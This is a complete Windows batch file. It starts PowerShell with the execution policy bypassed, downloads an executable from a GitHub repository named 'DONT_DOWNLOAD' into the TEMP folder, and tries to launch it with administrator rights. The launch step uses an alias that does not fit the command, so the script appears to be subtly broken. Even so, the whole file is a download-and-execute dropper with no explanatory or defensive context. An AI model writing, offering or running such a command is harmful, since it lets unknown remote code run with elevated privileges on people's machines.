@echo off
powershell -ep bypass -c "iwr https://github.com/a29227958-eng/DONT_DOWNLOAD/raw/refs/heads/main/test.exe -OutFile $env:TEMP\t.exe;sp $env:TEMP\t.exe -Verb RunAs"